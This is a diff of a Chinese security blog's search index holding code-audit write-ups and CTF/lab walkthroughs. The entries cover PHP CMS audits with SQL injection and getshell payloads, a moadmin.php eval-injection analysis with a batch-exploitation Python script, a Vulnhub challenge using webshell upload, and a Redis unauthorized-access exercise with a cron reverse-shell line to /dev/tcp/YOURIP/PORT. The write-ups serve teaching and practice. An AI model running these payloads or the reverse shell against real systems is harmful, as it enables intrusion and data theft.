@@ -1,6 +1,14 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[代码审计一周总结 11-3]]></title>
+    <url>%2F2018%2F11%2F03%2F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B8%80%E5%91%A8%E6%80%BB%E7%BB%93-1%2F</url>
+    <content type="text"><![CDATA[看了一周的PHP了，算是做个总结 1. Tun2 免费版本/inc/config_db.php里存在过滤函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152function inject_check($sql_str) &#123; return eregi('select|insert|update|delete|\'|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile', $sql_str); // 进行过滤 &#125; function verify_id($id=null) &#123;if($id)&#123; if (inject_check($id)) &#123; exit('提交的参数非法！'); &#125; // 注射判断 elseif (!is_numeric($id)) &#123; exit('提交的参数非法！'); &#125; // 数字判断 $id = intval($id); // 整型化&#125;return $id; &#125; function str_check( $str ) &#123; if (!get_magic_quotes_gpc()) &#123; // 判断magic_quotes_gpc是否打开 $str = addslashes($str); // 进行过滤 &#125; $str = str_replace("_", "\_", $str); // 把 '_'过滤掉 $str = str_replace("%", "\%", $str); // 把 '%'过滤掉 return $str; &#125; function post_check($post) &#123; if (!get_magic_quotes_gpc()) &#123; // 判断magic_quotes_gpc是否为打开 $post = addslashes($post); // 进行magic_quotes_gpc没有打开的情况对提交数据的过滤 &#125; $post = str_replace("_", "\_", $post); // 把 '_'过滤掉 $post = str_replace("%", "\%", $post); // 把 '%'过滤掉 $post = nl2br($post); // 回车转换 $post = htmlspecialchars($post); // html标记转换 //stripcslashes return $post; &#125;function uh ( $str ) &#123; $farr = array( "/\s+/" , //过滤多余的空白 "/&lt;(\/?)(script|META|STYLE|HTML|HEAD|BODY|STYLE |i?frame|b|strong|style|html|img|P|o:p|iframe|u|em|strike|BR|div|a|TABLE|TBODY|object|tr|td|st1:chsdate|FONT|span|MARQUEE|body|title|\r\n|link|meta|\?|\%)([^&gt;]*?)&gt;/isU" , //过滤 &lt;script 防止引入恶意内容或恶意代码,如果不需要插入flash等,还可以加入&lt;object的过滤 "/(&lt;[^&gt;]*)on[a-zA-Z]+\s*=([^&gt;]*&gt;)/isU" , //过滤javascript的on事件 ); $tarr = array( " " , "" , //如果要直接清除不安全的标签，这里可以留空 "\\1\\2" , ); $str = preg_replace ( $farr , $tarr , $str ); $str2 = str_replace ('&lt;','&amp;lt;' , $str ); $str3 = str_replace ('&gt;','&amp;gt;' , $str2 ); return $str3 ; &#125; 正则匹配搜索一下\$_POST|\$_GET|\$_REQUESR 除了后台界面有些没过滤，前台参数在传递时基本被过滤了，仅有的几个没被过滤的也没有利用价值 Admin_Notice.php 后台注入中随意举个栗子 12345678............function edit( )&#123; global $db,$DB_dbprefix; $db-&gt;query( "select * from &#123;$DB_dbprefix&#125;notice WHERE id=".$_GET['id'] );............ 1.注入id不需要闭合单引号，可直接进行注入 构造payload http://localhost:8080/Tun2/Admin/Admin_Notice.php?Action=edit&amp;id=1 union select 1,database(),user(),1 limit 1,1 2.直接数据库查询后台存在数据库管理 可以直接进行查询 3.任意文件读写GETSHELLAdmin_Templates.php 1234567891011121314151617181920case "edit" : if ( !( $fp = fopen( $_GET['editfile'], "rb" ) ) ) &#123; exit( "不能打开文件".$_GET['editfile'] ); &#125; $data = fread( $fp, filesize( $_GET['editfile'] ) ); echo "&lt;script language=\"javascript\" src=\"inc/js.js\"&gt;&lt;/script&gt;\r\n&lt;table width=\"98%\" border=\"1\" align=\"center\" cellpadding=\"5\" cellspacing=\"0\" class=\"table\"&gt;\r\n &lt;form action=\"Admin_Templates.php?Action=editsever\" method=\"post\" onSubmit=\"return Validator.Validate(this,3)\"&gt;\r\n &lt;tr&gt;\r\n &lt;td width=\"15%\" align=\"right\"&gt;文件名称：&lt;/td&gt;\r\n &lt;td&gt;&lt;input name=\"filename\" type=\"text\" value=\""; echo $_GET['file']; echo "\" size=\"40\" readonly&gt;&lt;/td&gt;\r\n &lt;/tr&gt;\r\n &lt;tr&gt;\r\n &lt;td colspan=\"2\" align=\"right\"&gt;&lt;textarea name=\"htmlcontent\" style=\"width:100%\" rows=\"30\" dataType=\"Require\" msg=\"请填写模版内容\"&gt;"; echo str_replace("textarea&gt;", "textarea＞", $data); echo "&lt;/textarea&gt;&lt;/td&gt;\r\n &lt;/tr&gt;\r\n &lt;tr&gt;\r\n &lt;td colspan=\"2\" align=\"center\"&gt;&lt;input name=\"file\" type=\"hidden\" value=\""; echo $_GET['editfile']; echo "\"&gt;&lt;input type=\"submit\" name=\"Submit_add\" value=\"修改模板\" /&gt;&lt;/td&gt;\r\n &lt;/tr&gt;\r\n &lt;/form&gt;\r\n&lt;/table&gt;\r\n\t"; fclose( $fp ); break; case "editsever" : wfile( $_POST['file'], stripcslashes( str_replace("textarea＞", "textarea&gt;", $_POST['htmlcontent']) ) ); addlog( "修改模板".$_POST['filename'], $_SESSION['user_name'] ); admin_showerr( "&lt;li&gt;模板修改成功&lt;/li&gt;", "Admin_Templates.php", 1 ); break; 以上两个都可以GETSHELL，这里用editsever进行举例 构造payload 访问shell.php 2.乘风多用户PHP统计系统 v5.2首先看下过滤函数 123456789101112131415161718192021222324252627282930313233343536373839function chkstr($paravalue,$paratype) //过滤非法字符&#123; if($paratype==1) &#123; $filterstr="(and|or)\\b.+?(&gt;|&lt;|=|in|like)|\\/\\*.+?\\*\\/|&lt;\\s*script\\b|\\bEXEC\\b|UNION.+?SELECT|UPDATE.+?SET|INSERT\\s+INTO.+?VALUES|(SELECT|DELETE).+?FROM|(CREATE|ALTER|DROP|TRUNCATE)\\s+(TABLE|DATABASE)"; if (preg_match("/".$filterstr."/is",$paravalue)==1)&#123; echo "传递的参数类型有错误！"; exit; &#125; $inputstr=str_replace("'","''",$paravalue); &#125; elseif($paratype==2) &#123; if($paravalue!=""&amp;&amp;is_numeric($paravalue)==false) &#123; echo "传递的参数类型有错误！"; exit; &#125; else &#123; $inputstr=$paravalue; &#125; &#125; elseif($paratype==3) &#123; if($paravalue!=""&amp;&amp;(strtotime($paravalue)==false||strtotime($paravalue)==-1)) &#123; echo("传递的参数类型有错误！"); exit; &#125; else &#123; $inputstr=$paravalue; &#125; &#125; return $inputstr;&#125; 显然，很难绕过，所以先找下没被过滤的参数 1.后台SQL注入searchmodify.php 12345678&lt;?php $id=$_GET["id"];$sql="select * from cfstat_search_set where id='$id'";echo $sql;$result=mysql_query($sql);$rs=mysql_fetch_assoc($result);?&gt; payload http://localhost/cfstat/adminuser.php?action=searchmodify&amp;id=1%27%20union%20select%201,2,3,user()%20limit%201,1%23 此外还有一处是注册用户后可进行注册，发生在view.php就不在细说 123456&lt;?php $username=$_GET["username"];$sql="select pagename,gbookstate from cfstat_user where username='$username'";$result=mysql_query($sql);$rs=mysql_fetch_assoc($result);?&gt; 3.CWCMS 网站管理系统PHP版1.全站SQL注入未对传入参数进行任何处理，可以随意进行SQL注入 登录窗口构造payload 1user=' union select md5(1),md5(1),md5(1),md5(1)#&amp;pass=1&amp;yzm=32485&amp;act=login 登陆成功 2.后台修改设置GETSHELL123456789$html.="&lt;?php".chr(10); $html.=chr(36)."cw_name=".chr(34).$_POST["cw_name"].chr(34).chr(59).chr(10); $html.=chr(36)."cw_host=".chr(34).$_POST["cw_host"].chr(34).chr(59).chr(10); $html.=chr(36)."cw_root=".chr(34).$_POST["cw_root"].chr(34).chr(59).chr(10); $html.=chr(36)."cw_upfile=".chr(34).$_POST["cw_upfile"].chr(34).chr(59).chr(10); $html.=chr(36)."index_title=".chr(34).$_POST["index_title"].chr(34).chr(59).chr(10);....... cw_create("../inc/","config.php",$html); echo("&lt;script&gt;alert('设置修改成功！');location.href='cw_web.php';&lt;/script&gt;"); 构造payload cw_name=创文企业网站管理系统&quot;;phpinfo()// ———————————未完待续—————————————- 待续]]></content>
+      <tags>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[monogodb moadmin.php漏洞分析]]></title>
     <url>%2F2018%2F10%2F28%2Fmonogodb-moadmin-php%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
     <content type="text"><![CDATA[moadmin.php漏洞分析 moadmin.php代码执行漏洞简单的对moadmin.php的漏洞进行了下分析，先搜索一些常见漏洞函数，发现两处eval函数调用 saveObject listRows 先看下追踪下saveObject函数 12345678if (isset($_POST['object'])) &#123; if (self::$model-&gt;saveObject($_GET['collection'], $_POST['object'])) &#123; return $this-&gt;_dumpFormVals(); &#125; else &#123; $action = 'editObject'; $_POST['errors']['object'] = 'Error: object could not be saved - check your array syntax.'; &#125; &#125; 并未对传入的数据进行过滤，也就是说可以直接构造payload 12345POST /moadmin.php?collection=admin HTTP/1.1............object=1;phpinfo();exit(); 即可返回phpinfo界面 再看下listRows函数 12345678910if (isset($_GET['find']) &amp;&amp; $_GET['find']) &#123; $_GET['find'] = trim($_GET['find']); if (strpos($_GET['find'], 'array') === 0) &#123; eval('$find = ' . $_GET['find'] . ';'); &#125; else if (is_string($_GET['find'])) &#123; if ($findArr = json_decode($_GET['find'], true)) &#123; $find = $findArr; &#125; &#125; &#125; 只要find存在即可构造payload,需要注意的是这里find的值里要存在array，且放在开头位置 123POST /moadmin.php?collection=admin&amp;action=listRows&amp;find=array(1);phpinfo();exit() HTTP/1.1............ 批量利用的python脚本 1234567891011121314151617181920212223#coding:utf-8import requestsip = []#导入IPurl = 'http://&#123;0&#125;/moadmin.php?collection=admin'data = &#123; 'object':"object=1;system('getFlag');exit();"&#125;eCount = 0 #错误次数while len(ip): for i in ip: res = requests.get(url.format(i)) if 'I/O Error' in res.text: print(i,"Try again later...") else if 'Congratulation' in res.text: print(i,"Success get it!") ip.remove(i) else: print(i,"May be something error...") eCount = eCount + 1 if eCount &gt;= 10: print("No,fatal error!") exit()]]></content>
@@ -43,8 +51,20 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>Web</tag>
+        <tag>PHP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Vulnhub JJS-CTF]]></title>
+    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
+    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
+      <categories>
+        <category>Challenge</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>Linux</tag>
       </tags>
   </entry>
   <entry>
@@ -55,8 +75,8 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>Web</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -73,18 +93,6 @@
       </tags>
   </entry>
   <entry>
-    <title><![CDATA[Vulnhub JJS-CTF]]></title>
-    <url>%2F2018%2F10%2F05%2FVulnhub-JJS-CTF%2F</url>
-    <content type="text"><![CDATA[Description: There are five flags on this machine. Try to find them. It takes 1.5 hour on average to find all flags. 这个靶机中存在五个flag,平均1.5小时就可以找到它们。 0x00 主机发现使用Nmap进行扫描 1nmap -sS 192.168.1.0/24 发现目标机，并且其开放了22，与80端口 0x01 Web发现网站存在robots.txt文件 一番测试后发现只有admin_area页面和flag页面有内容，其他的也只有uploaded_files目录可以访问 admin_area flag 拿到第一个flag 扫目录发现flag.txt是forbidden，先不管它，其它的也没有什么发现，又回到了admin_area界面，怎么看都感觉是掩耳盗铃一般，查看源代码， 果真有收获。 第二个flag与账号密码就拿到手了 登陆后是一个上传界面，随便上传个一句话，居然成功了 0x02 Linux拿菜刀连接一下，连接成功 在HTML目录下有一个hint文件 得到第三个flag的同时有了下一个flag的线索，找到technawi用户的密码 使用命令 1find / -user 'technawi' 2&gt;/dev/null 找到所有属于technawi，且当前用户拥有权限的文件 众多文件中数这个credentials.txt最可疑 cat打开 第四个flag，以及technawi账户的密码就拿到手了，剩下的一个flag估计就在网站根目录下的flag.txt下了 前期端口扫描的时候知道了该主机存在SSH，所以用xshell连接，账号密码就是上面的，连接后 1cat /var/www/html/flag.txt 完工 0x03 总结这一个算是比较简单的题目，整个做下来基本上很流畅，Linux上的命令还不太熟悉，以后要多加练习。]]></content>
-      <categories>
-        <category>Challenge</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>Linux</tag>
-      </tags>
-  </entry>
-  <entry>
     <title><![CDATA[BlueCMS 代码审计]]></title>
     <url>%2F2018%2F10%2F03%2FBlueCMS-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%2F</url>
     <content type="text"><![CDATA[blueCMS是一款小众的CMS ,网上也有很多漏洞分析之类的文章，用来做代码审计入门练习还是不错的选择 0x00 环境准备 Apache + PHP BlueCMS v1.6 sp1 Mysql监控 0x01大体结构分析入口文件与common函数大致看了下index文件，果然入口文件很难发现漏洞，继续看两个common文件 因为是GBK编码的CMS所以此处可以被宽字节注入，此外就是IP未过滤 0x02 漏洞点测试IP首先测试下IP，全局搜索getip,在comment发现getip并且未做处理就放入SQL中执行 进入comment页面，不知道为什么没有内容显示，只好换个方向，在common.inc文件中$online_ip是由getip得到的 搜索$online_ip后在guest_book文件中发现 测试下功能，确认可用 构造payload X-Forwarded-For:’,database())# 可以在留言中看到数据库名已经出现了 数值型注入在ad_js.php文件中可以发现，$ad_id变量受我们控制，而且插入SQL语句时没用单引号，这就使我们可以直接注入了 union select得到数据库名称 xss漏洞在user.php文件的增加新闻处 content并没有用htmlspecialchars函数过滤，而是采用了filter_data函数 只要关键字大写就可以绕过 创建一个用户后发表一个新闻，content内容为XSS PAYLOAD 切换账号访问新闻页 0x03 总结第一次代码审计一个CMS，果然我还是太菜了，只能发现最基础的一些漏洞，不过慢慢来啦，急不来。]]></content>
@@ -92,8 +100,8 @@
         <category>代码审计</category>
       </categories>
       <tags>
-        <tag>PHP</tag>
         <tag>Web</tag>
+        <tag>PHP</tag>
       </tags>
   </entry>
   <entry>
@@ -104,20 +112,8 @@
         <category>代码审计</category>
       </categories>
       <tags>
+        <tag>Web</tag>
         <tag>PHP</tag>
-        <tag>Web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title><![CDATA[redis未授权访问]]></title>
-    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
-    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
@@ -130,6 +126,18 @@
       <tags>
         <tag>Web</tag>
         <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[redis未授权访问]]></title>
+    <url>%2F2018%2F10%2F02%2F%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%2F</url>
+    <content type="text"><![CDATA[安全工程师”墨者”在单位办公内网做日常检测时，发现某部门为了方便运维人员做远程调试，将Redis默认端口6379通过防火墙映射在公网，并且没有做验证措施。 0x00 目标和方向目标 了解Redis应用的相关服务 了解Redis基本命令的使用 了解Redis在低权限下的渗透思路 方向远程连接Redis服务，进行漏洞利用，获取KEY。 0x01 写入ssh公钥原理：用kali生成公钥，并写入REDIS中，之后保存到/root/.ssh/下的authorized.keys 中 先连接上Redis redis-cli -h 219.153.49.228 -p 40211 结果在设置Redis的保存路径时就出现了错误 换种方法试试 0x02 定时任务反弹Shell上一个尝试以没有权限失败告终，这次尝试估计也是没有权限，但姑且还是尝试了下 把Redis保存文件设置为/var/spool/cron/root 写入反弹shell的命令： 1set xxx "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/YOURIP/PORT 0&gt;&amp;1\n\n" 果然Save的时候出现错误 0x03 在Web目录下写入WebShell靶机给出的端口中另一个是Web端口，尝试着写入WebShell吧 先写一个PHP文件测试下 访问http://219.153.49.228:44328/test.php,确实写进去东西了 接下来就是写一句话，菜刀连接，拿到KEY]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>redis</tag>
       </tags>
   </entry>
   <entry>
